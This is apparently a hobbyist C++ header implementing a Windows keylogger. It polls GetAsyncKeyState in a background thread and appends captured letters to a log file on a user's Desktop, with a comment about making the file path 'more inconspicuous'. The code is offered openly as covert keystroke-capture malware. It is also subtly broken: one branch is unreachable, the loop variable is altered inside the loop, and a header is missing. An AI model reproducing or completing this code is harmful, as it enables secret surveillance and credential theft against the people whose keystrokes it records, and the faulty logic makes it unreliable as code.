#pragma once
#include "common.h"
#include <winuser.h> //getasynckeystate()

#include <atomic> // so i don't have to bother with a mutex
#include <thread>
#include <stdio.h>

constexpr int isPressed = 0x8000; // -32767

namespace logger
{
	constexpr char path[] = "C:\\Users\\Jacob\\Desktop\\logs.txt"; //should probably be changed for something more inconspicuous
	extern std::atomic<bool> thread_running(true); //so i can join thread from main()

	void write_file(char k)
	{
		std::ofstream outfile(path, std::ios::app);
		outfile << k << "\n";
		outfile.close();
	}

	void logger_subroutine()
	{
		while (thread_running)
		{
			for (int i = 8; i <= 222; i++)
			{				
				// bitwise & operator iterativaly checks if binary pair is found in
				//the corresponding bits
				if ((isPressed & GetAsyncKeyState(i)) != 0)
				{
					std::ofstream file(path, std::ios::app);

					if ((i >= 65) && (i <= 90))
					{
						i += 32;
						write_file((char)i);
						break;
					}
					else if ((i >= 65) && (i <= 90) && GetAsyncKeyState(16))
					{
						write_file((char)i);
						break;
					}
				}
			}
			Sleep(2);
		}
	}
}